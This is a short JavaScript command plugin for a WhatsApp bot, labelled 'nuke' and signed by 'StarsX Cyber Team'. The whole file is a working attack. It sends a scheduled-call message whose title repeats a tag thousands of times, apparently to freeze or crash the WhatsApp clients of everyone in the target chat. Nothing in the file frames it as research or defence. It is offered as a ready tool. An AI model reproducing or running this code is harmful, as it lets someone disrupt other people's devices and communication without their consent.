let handler = async (m, { conn, command}) => {

conn.relayMessage(m.chat, {
scheduledCallCreationMessage: {
		callType: "AUDIO",
		scheduledTimestampMs: Date.now(),
		title: "[!] StarsX Cyber Team Was Here [!]   ".repeat(99*99)
		}
	}, {})
}

handler.help = ['nuke'];
handler.tags = ['tools'];
handler.command = /^(nuke)$/i;
handler.owner = true;
module.exports = handler;